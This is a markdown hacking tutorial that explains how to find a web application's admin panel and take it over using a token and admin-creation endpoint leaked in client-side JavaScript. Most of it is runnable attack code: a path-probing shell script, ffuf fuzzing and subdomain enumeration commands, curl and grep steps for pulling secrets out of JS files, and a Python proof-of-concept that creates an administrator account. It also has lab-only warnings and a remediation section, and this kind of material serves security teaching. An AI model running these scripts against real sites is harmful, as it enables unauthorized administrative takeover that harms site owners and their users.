# How to bypass Admin Panel just by JS file
## (Educational Purposes Only - For Use in Authorized Lab Environments)

**🔴🔴🔴 WARNING: ETHICAL USE AND LEGAL COMPLIANCE REQUIRED 🔴🔴🔴**

This document provides a detailed walkthrough for educational purposes, demonstrating techniques to find web application admin panels and analyze client-side JavaScript for specific types of vulnerabilities.

**YOU MUST ONLY APPLY THESE TECHNIQUES TO:**
1.  **Systems you OWN and have built for testing.**
2.  **Intentionally vulnerable applications in a controlled lab environment (e.g., OWASP Juice Shop, DVWA).**
3.  **Targets for which you have EXPLICIT, WRITTEN PERMISSION from the owner (e.g., official bug bounty programs, within defined scope).**

**UNAUTHORIZED ACCESS OR TESTING IS ILLEGAL AND UNETHICAL. YOU ARE RESPONSIBLE FOR YOUR ACTIONS.**

---

## Table of Contents
1.  [Objective & Scope](#1-objective--scope)
2.  [Prerequisites & Lab Setup](#2-prerequisites--lab-setup)
3.  [Phase 1: Reconnaissance & Admin Panel Discovery](#3-phase-1-reconnaissance--admin-panel-discovery)
    *   [3.1. Manual Exploration & Common Path Guessing](#31-manual-exploration--common-path-guessing)
    *   [3.2. Checking `robots.txt` and `sitemap.xml`](#32-checking-robotstxt-and-sitemapxml)
    *   [3.3. Subdomain Enumeration](#33-subdomain-enumeration)
    *   [3.4. Directory/Path Fuzzing](#34-directorypath-fuzzing)
    *   [3.5. Confirming the Admin Panel URL](#35-confirming-the-admin-panel-url)
4.  [Phase 2: Client-Side Code Analysis (Admin Login Page)](#4-phase-2-client-side-code-analysis-admin-login-page)
    *   [4.1. Inspecting HTML Source](#41-inspecting-html-source)
    *   [4.2. Fetching and Reviewing JavaScript Files](#42-fetching-and-reviewing-javascript-files)
    *   [4.3. Identifying Vulnerable Information in JS](#43-identifying-vulnerable-information-in-js)
5.  [Phase 3: Proof of Concept - Exploiting the JS Vulnerability](#5-phase-3-proof-of-concept---exploiting-the-js-vulnerability)
    *   [5.1. Understanding the Vulnerable Endpoint](#51-understanding-the-vulnerable-endpoint)
    *   [5.2. Crafting and Sending the Exploit Request](#52-crafting-and-sending-the-exploit-request)
6.  [Phase 4: Verification & Post-Exploitation (Ethical)](#6-phase-4-verification--post-exploitation-ethical)
    *   [6.1. Verifying Admin Access](#61-verifying-admin-access)
    *   [6.2. Documentation & Reporting](#62-documentation--reporting)
7.  [Remediation & Prevention](#7-remediation--prevention)
8.  [Conclusion](#8-conclusion)

---

## 1. Objective & Scope

*   **Objective:** To demonstrate a methodical approach to locating a web application's administrative interface and subsequently analyzing its client-side JavaScript for vulnerabilities, specifically focusing on a scenario where hardcoded credentials or sensitive API endpoints/tokens are exposed, potentially allowing an admin panel bypass.
*   **Scope (For This Educational Guide):** This guide assumes you are targeting an application **within your own controlled lab environment** or one for which you have **explicit, written permission** to test.
*   **Simulated Vulnerability:** Exposure of an admin creation endpoint and an authorization token within a publicly accessible JavaScript file.

---

## 2. Prerequisites & Lab Setup

*   **A Permitted Target Web Application:**
    *   **Highly Recommended:** Install OWASP Juice Shop (`docker pull bkimminich/juice-shop` then `docker run --rm -p 3000:3000 bkimminich/juice-shop`) or DVWA (Damn Vulnerable Web Application).
    *   Alternatively, use a simple web app you've built yourself for this purpose.
    *   **CRITICAL:** Define your target's base URL. For this guide, we'll use a placeholder.
        ```bash
        # In your notes or a shell script for convenience
        export TARGET_BASE_URL="http://localhost:3000" # Example for local Juice Shop
        # !!! REPLACE THIS WITH YOUR ACTUAL AUTHORIZED LAB TARGET URL !!!
        ```
*   **Tools Environment:**
    *   **Web Browser:** Firefox or Chrome with Developer Tools (F12).
    *   **Terminal:** Termux (Android), Linux/macOS Terminal, or Windows PowerShell/WSL.
    *   **Essential CLI Tools:**
        *   `curl`: (Usually pre-installed. In Termux: `pkg install curl`)
        *   `python3` & `pip`: (In Termux: `pkg install python`)
        *   `requests` (Python library): `pip install requests`
    *   **Optional Recon Tools (Install as needed):**
        *   `ffuf` (Path fuzzer): Download from GitHub releases or `apt install ffuf` / `brew install ffuf`.
        *   `subfinder` (Subdomain enumeration): Download from GitHub releases or `go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest`.
        *   `whatweb` (Technology identification): `apt install whatweb` / `brew install whatweb`.
    *   **Text Editor:** `nano`, `vim`, VS Code, etc.
    *   **Wordlists (for Fuzzing):**
        *   Download SecLists: `git clone https://github.com/danielmiessler/SecLists.git`
        *   A good starting point: `SecLists/Discovery/Web-Content/common.txt` or `raft-medium-directories.txt`.
        ```bash
        # In your notes or a shell script
        export WORDLIST_PATH="${HOME}/SecLists/Discovery/Web-Content/raft-medium-directories.txt"
        # !!! REPLACE THIS WITH THE ACTUAL PATH TO YOUR CHOSEN WORDLIST !!!
        ```

---

## 3. Phase 1: Reconnaissance & Admin Panel Discovery

The goal here is to find the login page for the administrative section of the web application.

### 3.1. Manual Exploration & Common Path Guessing

Manually browse the application. Then, try common paths.

*   **Action:** Open your browser and navigate to `{$TARGET_BASE_URL}`. Explore the site. Then, try appending common admin paths like `/admin`, `/login`, `/administrator`, `/panel`, etc.
*   **Code (Shell script to check a list of common paths):**
    ```bash
    #!/bin/bash
    # admin_path_checker.sh

    # Use the TARGET_BASE_URL defined in your environment or set it here:
    # TARGET_BASE_URL="http://your-lab-target.com" # !!! REPLACE IF NOT USING ENV VAR !!!
    if [ -z "${TARGET_BASE_URL}" ]; then
        echo "[ERROR] TARGET_BASE_URL is not set. Please set it and run again."
        exit 1
    fi

    COMMON_PATHS=(
        "/admin" "/administrator" "/admin.php" "/admin.html"
        "/login" "/login.php" "/login.html"
        "/user" "/user/login"
        "/panel" "/cpanel" "/controlpanel"
        "/admin_area" "/admin_panel" "/admin_login"
        "/backend" "/manage" "/manager"
        "/wp-admin" "/wp-login.php" # WordPress specific
        "/joomla/administrator" # Joomla specific
        # Add more paths based on suspected technology or common patterns
    )

    echo "[INFO] Starting admin path check for ${TARGET_BASE_URL}"
    for path in "${COMMON_PATHS[@]}"; do
        FULL_URL="${TARGET_BASE_URL}${path}"
        echo -n "[TRYING] ${FULL_URL} ... "
        # -s: silent, -L: follow redirects, -I: head only (faster for existence check), -o /dev/null: discard body
        # -w "%{http_code}": output only the HTTP status code
        http_code=$(curl -s -L -o /dev/null -w "%{http_code}" --connect-timeout 5 "${FULL_URL}")
        
        if [ "$http_code" = "200" ]; then
            echo -e "\033[0;32mFOUND (200 OK)\033[0m"
            # Optionally fetch title
            # title=$(curl -s -L --connect-timeout 5 "${FULL_URL}" | grep -i -o '<title>.*</title>' | head -n 1 | sed -e 's/<title>//I' -e 's/<\/title>//I')
            # echo "    Title: ${title}"
        elif [ "$http_code" = "301" ] || [ "$http_code" = "302" ] || [ "$http_code" = "307" ]; then
            location=$(curl -s -I -L --connect-timeout 5 "${FULL_URL}" | grep -i '^Location:' | awk '{print $2}' | tr -d '\r')
            echo -e "\033[0;33mREDIRECT (${http_code}) to ${location}\033[0m"
        elif [ "$http_code" = "401" ] || [ "$http_code" = "403" ]; then
            echo -e "\033[0;31mPROTECTED (${http_code})\033[0m - Path likely exists but requires auth."
        else
            # Uncomment for more verbosity on other codes, or just ignore non-interesting ones
            # echo "Status: ${http_code}"
            echo -n "" # Suppress newline for non-interesting paths for cleaner output
        fi
        # Add a small delay to be less aggressive on the server
        sleep 0.1
    done
    echo "[INFO] Path check complete."
    ```
    *   **To Run:** Save as `admin_path_checker.sh`, `chmod +x admin_path_checker.sh`, then `./admin_path_checker.sh`.
    *   **Look For:** `200 OK` on pages that look like login forms, or `401/403` on paths that might be protected admin areas.

### 3.2. Checking `robots.txt` and `sitemap.xml`

These files can sometimes inadvertently reveal paths.

*   **Code (Shell):**
    ```bash
    # Ensure TARGET_BASE_URL is set
    echo "[INFO] Contents of ${TARGET_BASE_URL}/robots.txt:"
    curl -s -L "${TARGET_BASE_URL}/robots.txt"
    echo -e "\n\n[INFO] Contents of ${TARGET_BASE_URL}/sitemap.xml (or sitemap_index.xml):"
    curl -s -L "${TARGET_BASE_URL}/sitemap.xml" || curl -s -L "${TARGET_BASE_URL}/sitemap_index.xml"
    ```
*   **Look For:** `Disallow:` entries in `robots.txt` or URLs in `sitemap.xml` that seem administrative or sensitive.

### 3.3. Subdomain Enumeration

Admin panels can also reside on subdomains like `admin.target.com`.

*   **Action:** Use `subfinder` (if applicable to your target domain structure).
*   **Code (Shell):**
    ```bash
    # TARGET_DOMAIN should be the root domain, e.g., "localhost" or "yourlabapp.com"
    # For http://localhost:3000, subdomain enumeration isn't typically relevant unless you've configured virtual hosts.
    # This is more for targets like "yourpermmittedtarget.com"
    # export TARGET_DOMAIN="your-lab-domain.com" # !!! REPLACE !!!

    if [ -z "${TARGET_DOMAIN}" ]; then
        echo "[INFO] TARGET_DOMAIN not set, skipping subdomain enumeration."
    elif ! command -v subfinder &> /dev/null; then
        echo "[WARN] subfinder command not found. Skipping subdomain enumeration."
    else
        echo "[INFO] Enumerating subdomains for ${TARGET_DOMAIN}..."
        subfinder -d "${TARGET_DOMAIN}" -silent -o "subdomains_${TARGET_DOMAIN}.txt"
        if [ -s "subdomains_${TARGET_DOMAIN}.txt" ]; then
            echo "[SUCCESS] Subdomains found for ${TARGET_DOMAIN}:"
            cat "subdomains_${TARGET_DOMAIN}.txt"
            echo "--- Look for 'admin', 'portal', 'dev', 'staging', 'test' etc. ---"
        else
            echo "[INFO] No subdomains found by subfinder for ${TARGET_DOMAIN}."
        fi
    fi
    ```

### 3.4. Directory/Path Fuzzing

Automated discovery of hidden directories and files. **Use responsibly and ensure your wordlist path is correct.**

*   **Action:** Use `ffuf` with a comprehensive wordlist.
*   **Code (Shell):**
    ```bash
    # Ensure TARGET_BASE_URL and WORDLIST_PATH are set
    if [ -z "${TARGET_BASE_URL}" ] || [ -z "${WORDLIST_PATH}" ]; then
        echo "[ERROR] TARGET_BASE_URL or WORDLIST_PATH is not set. Please set them."
        exit 1
    fi
    if [ ! -f "${WORDLIST_PATH}" ]; then
        echo "[ERROR] Wordlist not found at: ${WORDLIST_PATH}"
        exit 1
    fi
    if ! command -v ffuf &> /dev/null; then
        echo "[WARN] ffuf command not found. Skipping path fuzzing."
    else
        echo "[INFO] Starting directory/path fuzzing on ${TARGET_BASE_URL} with wordlist ${WORDLIST_PATH}"
        # -mc: match status codes (200, 204, 301, 302, 307, 401, 403 are often interesting)
        # -fc: filter out status codes (e.g., 404 if it's too noisy)
        # -fs: filter by size (if 404 pages have a consistent size, filter them out)
        # -c: colorized output
        # -t: threads (adjust based on target and your connection, default is 40)
        # -timeout: request timeout
        # -recursion: ffuf can recursively fuzz directories it finds (use with caution, can be very noisy)
        # -recursion-depth: limit recursion
        
        ffuf -w "${WORDLIST_PATH}" -u "${TARGET_BASE_URL}/FUZZ" \
             -mc 200,204,301,302,307,401,403 \
             -fc 404 \
             -t 50 -timeout 10 -c
        
        # Optionally, fuzz for common file extensions if the server might hide them:
        # echo "[INFO] Fuzzing for .php extensions..."
        # ffuf -w "${WORDLIST_PATH}:FUZZ,${WORDLIST_PATH}:KNOWN" -u "${TARGET_BASE_URL}/FUZZ.php" -e ".php" -mc 200,204,301,302,307,401,403 -fc 404 -t 50 -c
    fi
    ```
*   **Look For:** Paths that return `200 OK`, `301/302 Redirects` (investigate where they lead), or `401/403 Forbidden` (indicates the path exists but is protected – could still be the admin login).

### 3.5. Confirming the Admin Panel URL

From the steps above, you should have one or more candidate URLs for the admin panel. Visit them in your browser to confirm.

*   **Action:** Set this confirmed URL for the next phases.
    ```bash
    # In your notes or shell environment
    export ADMIN_LOGIN_URL="${TARGET_BASE_URL}/admin" # !!! REPLACE with your confirmed admin login URL !!!
    echo "[CONFIRMED] Admin Login URL set to: ${ADMIN_LOGIN_URL}"
    ```

---

## 4. Phase 2: Client-Side Code Analysis (Admin Login Page)

Now, analyze the client-side code of the identified admin login page for vulnerabilities.

### 4.1. Inspecting HTML Source

*   **Action:** Navigate to `{$ADMIN_LOGIN_URL}` in your browser.
    1.  Right-click -> "View Page Source" (or Ctrl+U / Cmd+U).
    2.  Alternatively, open Developer Tools (F12), go to the "Elements" (Chrome) or "Inspector" (Firefox) tab.
*   **Look For:**
    *   `<script src="..."></script>` tags. Note down the paths to all JavaScript files, especially those that seem custom or admin-specific (e.g., `admin.js`, `app-bundle.js`, `main.js`, anything in `/js/`, `/assets/`, `/static/`).
    *   HTML comments `<!-- ... -->` for any leaked information.
    *   Hidden input fields `<input type="hidden" ...>` that might reveal tokens or state.

### 4.2. Fetching and Reviewing JavaScript Files

Retrieve the content of the identified JS files for deeper analysis.

*   **Action:** For each interesting JS file path found (e.g., `/js/admin-dashboard.js`):
    1.  Construct the full URL: `JS_FILE_FULL_URL="${ADMIN_LOGIN_URL_OR_BASE_URL_AS_APPROPRIATE}/js/admin-dashboard.js"` (Note: JS paths can be relative to the page or the root).
    2.  **Option A (Browser Developer Tools):**
        *   Go to the "Sources" (Chrome) or "Debugger" (Firefox) tab in Developer Tools.
        *   Find the JS file in the navigation pane.
        *   If the code is minified/uglified, look for a "pretty-print" button (often `{ }`) to format it.
    3.  **Option B (Using `curl` and a text editor):**
        ```bash
        # Ensure ADMIN_LOGIN_URL or relevant base for JS is set
        # JS_FILE_PATH="/js/admin-dashboard.js" # !!! REPLACE with actual JS file path !!!
        # JS_FILE_FULL_URL="${TARGET_BASE_URL}${JS_FILE_PATH}" # Adjust if JS path is relative to ADMIN_LOGIN_URL domain
        
        # Example to fetch a hypothetical JS file
        export JS_TO_ANALYZE_PATH="/js/app.c3a01.bundle.js" # !!! REPLACE with an actual JS file from your target !!!
        export JS_FILE_FULL_URL="${TARGET_BASE_URL}${JS_TO_ANALYZE_PATH}"
        export JS_OUTPUT_FILENAME="analyzed_script.js"

        if [ -z "${JS_FILE_FULL_URL}" ]; then
            echo "[ERROR] JS_FILE_FULL_URL is not set."
        else
            echo "[INFO] Fetching JS file: ${JS_FILE_FULL_URL}"
            curl -s -L "${JS_FILE_FULL_URL}" -o "${JS_OUTPUT_FILENAME}"
            if [ -s "${JS_OUTPUT_FILENAME}" ]; then
                echo "[SUCCESS] JS file saved to ${JS_OUTPUT_FILENAME}. Review it manually or with grep."
                echo "    Example: grep -iE 'token|secret|api_key|password|admin|config|endpoint|internal|dev' ${JS_OUTPUT_FILENAME} | less"
                # You can use tools like 'js-beautify' if the file is minified and you fetched it via curl
                # npm install -g js-beautify
                # js-beautify ${JS_OUTPUT_FILENAME} -o ${JS_OUTPUT_FILENAME}_beautified.js
            else
                echo "[ERROR] Failed to fetch or JS file is empty: ${JS_FILE_FULL_URL}"
            fi
        fi
        ```
*   **Searching within JavaScript:**
    *   Manually read through the (beautified) code.
    *   Use `Ctrl+F` (or `Cmd+F`) in browser tools/text editor, or `grep` in the terminal.
    *   **Keywords to search for:** `token`, `secret`, `apiKey`, `authKey`, `password`, `credentials`, `config`, `settings`, `devConfig`, `internalApi`, `admin`, `management`, `userCreate`, `addAdmin`, `deleteUser`, API endpoint patterns (e.g., `/api/`, `/v1/`, `/_internal/`), `debug`, `test`.

### 4.3. Identifying Vulnerable Information in JS

This is where you look for the specific type of vulnerability from the original scenario: an exposed token and an admin creation endpoint.

*   **Hypothetical Vulnerable Code Snippet (Example - what you might find):**
    ```javascript
    // Inside a file like analyzed_script.js (after beautifying if needed)
    // ... (lots of other JavaScript code) ...

    // Might be buried within objects or IIFEs (Immediately Invoked Function Expressions)
    (function() {
        var _appSettings = {
            apiUrl: "/api/v1",
            featureFlags: {
                enableNewDashboard: true
            },
            // !!! THIS SECTION LOOKS SUSPICIOUS - DEVELOPER LEFTOVER? !!!
            _internalDevFeatures: {
                adminCreationEndpoint: "/api/dev_only/v1.2/create_new_admin_user_account",
                tempDevAuthToken: "fixed_dev_auth_token_string_123_needs_removal_ASAP!",
                debugMode: true
            }
        };
        // ... more code using _appSettings ...
        window.MyAppConfig = _appSettings; // Or it might be used internally
    })();

    // ... (more code) ...
    ```
*   **Action: Record your findings carefully.**
    ```bash
    # In your notes or shell environment for the next phase
    export VULN_ENDPOINT_PATH="/api/dev_only/v1.2/create_new_admin_user_account" # !!! REPLACE with actual path found !!!
    export EXPOSED_TOKEN="fixed_dev_auth_token_string_123_needs_removal_ASAP!"    # !!! REPLACE with actual token found !!!
    export TOKEN_HEADER_NAME="X-Internal-Dev-Token" # GUESS or find clues how token is used. Common: X-API-Key, Authorization, X-Auth-Token
    export IS_BEARER_TOKEN=false # Set to true if token is used as "Authorization: Bearer <token>"
    
    echo "[VULN INFO] Endpoint Path: ${VULN_ENDPOINT_PATH}"
    echo "[VULN INFO] Exposed Token: ${EXPOSED_TOKEN}"
    echo "[VULN INFO] Assumed Token Header: ${TOKEN_HEADER_NAME}"
    ```

---

## 5. Phase 3: Proof of Concept - Exploiting the JS Vulnerability

Now, attempt to use the discovered endpoint and token to create a new admin user.

### 5.1. Understanding the Vulnerable Endpoint

*   **Name:** The path `create_new_admin_user_account` strongly suggests its purpose.
*   **Method:** Such actions are typically `POST` requests.
*   **Payload:** It will likely require a body (e.g., JSON) containing `username`, `password`, and possibly `email` or `role` for the new admin.
*   **Authentication:** The `EXPOSED_TOKEN` is presumed to be the authentication mechanism, likely sent in an HTTP header.

### 5.2. Crafting and Sending the Exploit Request

*   **Action:** Use `curl` or a Python script. Python is more flexible for complex payloads and headers.
*   **Code (Python script - save as `poc_admin_create.py`):**
    ```python
    #!/usr/bin/env python3
    # poc_admin_create.py
    # Proof-of-Concept to create an admin user via an exposed JS endpoint/token.
    # !!! FOR EDUCATIONAL USE IN AUTHORIZED LABS ONLY !!!

    import requests
    import json
    import os
    import sys

    # --- Configuration (Ideally load from environment variables set in previous steps) ---
    TARGET_BASE_URL = os.getenv("TARGET_BASE_URL", "http://default-target-if-not-set.com") # Fallback
    VULN_ENDPOINT_PATH = os.getenv("VULN_ENDPOINT_PATH", "/default/api/createAdmin")
    EXPOSED_TOKEN = os.getenv("EXPOSED_TOKEN", "default_dummy_token")
    TOKEN_HEADER_NAME = os.getenv("TOKEN_HEADER_NAME", "X-Auth-Token")
    IS_BEARER_TOKEN = os.getenv("IS_BEARER_TOKEN", "false").lower() == "true"

    # Desired credentials for the new PoC admin
    NEW_ADMIN_USERNAME = "js_bypass_admin"
    NEW_ADMIN_PASSWORD = "SecureP@sswordByp@ss123"
    NEW_ADMIN_EMAIL = f"{NEW_ADMIN_USERNAME}@lab.example.com"
    # --- ---

    def check_config():
        if "default-target-if-not-set.com" in TARGET_BASE_URL or \
           "/default/api/createAdmin" in VULN_ENDPOINT_PATH or \
           "default_dummy_token" in EXPOSED_TOKEN:
            print("[ERROR] Default configuration values detected. ")
            print("        Please ensure TARGET_BASE_URL, VULN_ENDPOINT_PATH, EXPOSED_TOKEN, TOKEN_HEADER_NAME are correctly set as environment variables or in the script.")
            print("        Example: export TARGET_BASE_URL=\"http://localhost:3000\"")
            sys.exit(1)

    def create_admin_poc():
        check_config()
        
        exploit_url = f"{TARGET_BASE_URL}{VULN_ENDPOINT_PATH}"

        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Educational PoC Script (Ethical Hacking Lab)"
            # Add other headers if the application seems to expect them
        }
        if IS_BEARER_TOKEN:
            headers[TOKEN_HEADER_NAME] = f"Bearer {EXPOSED_TOKEN}"
        else:
            headers[TOKEN_HEADER_NAME] = EXPOSED_TOKEN

        # Payload structure might need adjustment based on API specifics
        # Sometimes you need to guess or look for other JS code that makes similar POST requests
        payload = {
            "username": NEW_ADMIN_USERNAME,
            "password": NEW_ADMIN_PASSWORD,
            "email": NEW_ADMIN_EMAIL,
            "role": "administrator" # This field is a common guess
        }

        print(f"[INFO] Attempting to create admin user '{NEW_ADMIN_USERNAME}'")
        print(f"  URL: POST {exploit_url}")
        print(f"  Headers: {json.dumps(headers, indent=2)}")
        print(f"  Payload: {json.dumps(payload, indent=2)}")

        try:
            # For lab environments with self-signed SSL certs, you might need verify=False
            # For real (authorized) targets, verify should typically be True (default)
            response = requests.post(exploit_url, headers=headers, json=payload, timeout=15, verify=True) 

            print(f"\n[RESPONSE] Status Code: {response.status_code}")
            print(f"[RESPONSE] Headers:")
            for key, value in response.headers.items():
                print(f"  {key}: {value}")
            
            print(f"[RESPONSE] Body:")
            try:
                # Attempt to parse and pretty-print if JSON
                response_json = response.json()
                print(json.dumps(response_json, indent=2))
                # Check for success indicators within the JSON response
                if 200 <= response.status_code < 300:
                    if isinstance(response_json, dict) and \
                       (response_json.get("status") == "success" or response_json.get("message", "").lower().startswith("admin created")):
                        print("\n[SUCCESS] JSON response indicates admin account may have been created!")
                    elif 200 <= response.status_code < 300: # General success status
                         print("\n[POTENTIAL SUCCESS] Request was successful (2xx). Verify manually.")
            except json.JSONDecodeError:
                # If not JSON, print as text
                print(response.text)
                if 200 <= response.status_code < 300:
                     print("\n[POTENTIAL SUCCESS] Request was successful (2xx), but response was not JSON. Verify manually.")


            if not (200 <= response.status_code < 300):
                print("\n[FAILURE] Admin creation attempt failed or did not return a success status code.")

        except requests.exceptions.SSLError as e:
            print(f"\n[ERROR] SSL Error: {e}")
            print("         If this is a lab with a self-signed certificate, try setting `verify=False` in requests.post().")
            print("         Example: response = requests.post(..., verify=False)")
        except requests.exceptions.ConnectionError as e:
            print(f"\n[ERROR] Connection Error: {e}")
            print(f"         Ensure the target URL '{TARGET_BASE_URL}' and endpoint '{VULN_ENDPOINT_PATH}' are correct and the server is reachable.")
        except requests.exceptions.RequestException as e:
            print(f"\n[ERROR] An unexpected request error occurred: {e}")

    if __name__ == "__main__":
        print("--- Admin Creation PoC via JS Vulnerability ---")
        create_admin_poc()
    ```
    *   **To Run:**
        1.  Save as `poc_admin_create.py`.
        2.  Make sure your environment variables (`TARGET_BASE_URL`, `VULN_ENDPOINT_PATH`, `EXPOSED_TOKEN`, `TOKEN_HEADER_NAME`, `IS_BEARER_TOKEN`) are set correctly from the previous steps.
        3.  Run `python3 poc_admin_create.py`.
    *   **Analyze Output:** Check the HTTP status code and response body. A `200 OK` or `201 Created` with a success message is ideal. Other codes might indicate failure or different issues.

---

## 6. Phase 4: Verification & Post-Exploitation (Ethical)

### 6.1. Verifying Admin Access

*   **Action:**
    1.  Navigate back to the `{$ADMIN_LOGIN_URL}` in your browser.
    2.  Attempt to log in using the credentials you tried to create (e.g., `Username: js_bypass_admin`, `Password: SecureP@sswordByp@ss123`).
*   **Result:** If login is successful and you see an administrative dashboard, the PoC worked.

### 6.2. Documentation & Reporting

This `How_to_Bypass_Admin_Panel_Just_By_JS_File.md` itself serves as documentation. In a real engagement:

*   **Detailed Report:** Write a formal report detailing:
    *   The vulnerability found (e.g., "Exposure of Sensitive Information in Client-Side JavaScript Leading to Admin Account Creation").
    *   Steps to reproduce (referencing your documented steps).
    *   The exact JS file, code snippet, token, and endpoint.
    *   The impact (e.g., complete administrative takeover).
    *   Clear remediation advice.
*   **Screenshots/Evidence:** Include screenshots of the vulnerable JS code, the exploit request/response, and successful admin login.

---

## 7. Remediation & Prevention

*   **Never Hardcode Secrets:** API keys, tokens, passwords, or sensitive configuration should **NEVER** be embedded in client-side JavaScript, HTML, or mobile app code.
*   **Server-Side Authentication & Authorization:** All sensitive actions (like admin creation) **MUST** be rigorously authenticated and authorized on the server-side. Do not rely on client-side checks or "secret" tokens passed from the client as the sole security measure.
*   **Secure API Endpoints:** Internal or development API endpoints should not be publicly accessible or should require strong authentication distinct from any client-side tokens.
*   **Code Review & Static Analysis (SAST):** Implement security code reviews and use SAST tools to scan for hardcoded secrets and other common vulnerabilities before deployment.
*   **Build Process Sanitization:** Ensure your build/deployment process strips out:
    *   Developer comments that might leak information.
    *   Debugging code and features.
    *   Unused or development-only API endpoints.
    *   Test credentials or tokens.
*   **Principle of Least Privilege:** API tokens (if used server-to-server) should have the minimum necessary permissions.
*   **Content Security Policy (CSP):** While not a direct fix for this specific issue, a strong CSP can help mitigate other client-side attacks like XSS.

---

## 8. Conclusion

This guide demonstrated a scenario where an administrative panel was identified, and a vulnerability within its client-side JavaScript (exposed endpoint and token) was leveraged to potentially create a new administrative user. This underscores the critical importance of securing client-side code and ensuring robust server-side controls for all sensitive operations.

**Always practice ethical hacking responsibly and within legal boundaries. Continuous learning and adherence to security best practices are key to building and maintaining secure applications.**

---
**Follow @muneebwanee for more Hacking Tutorials**
